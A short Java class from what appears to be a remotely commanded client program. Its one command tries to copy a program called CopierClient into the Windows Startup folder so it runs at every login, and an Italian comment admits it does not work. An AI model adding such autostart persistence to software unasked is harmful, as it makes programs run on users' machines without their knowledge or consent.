package commands;

import java.io.IOException;

import command.AbstractCommand;
import model.ModelClient;

public class SetStartupCommand extends AbstractCommand {

	public SetStartupCommand(ModelClient _model) {
		super(_model);
	}

	@Override
	public String execute(String args) { //TODO non funziona
		String[] CMD={"copy", "%userprofile%/Downloads/CopierClient", "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"};
		try {
			Runtime.getRuntime().exec(CMD);
		} catch (IOException e) {
			model.getLogger().error(e);
		}
		return null;
	}

}
